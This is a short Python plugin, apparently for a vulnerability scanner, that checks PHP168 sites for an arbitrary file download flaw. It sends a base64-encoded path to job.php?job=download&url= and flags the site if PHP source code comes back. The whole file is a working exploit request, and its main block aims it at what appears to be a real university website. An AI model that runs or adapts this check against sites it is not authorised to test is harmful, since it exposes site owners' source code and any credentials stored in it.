#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Whoami
#_FileName_ = php168_downloadfile.py

import urlparse
import re

def assign(service, arg):
    if service == "php168":  
        return True, arg 

def audit(arg):
    url =  arg + 'job.php'
    temp = url.find('php')
    attack = (url[:temp + 1] + arg[:-1] + url[temp+1:]).encode('base64')[:-1]
    payload=url + '?' + 'job=download&url=' + attack
    code, head,res, errcode, _ = curl.curl2(payload)
    if code==200 and '<?php' in res and 'file_exists' in res:
        security_hole(payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('php168', 'http://yxy.ctgu.edu.cn/')[1])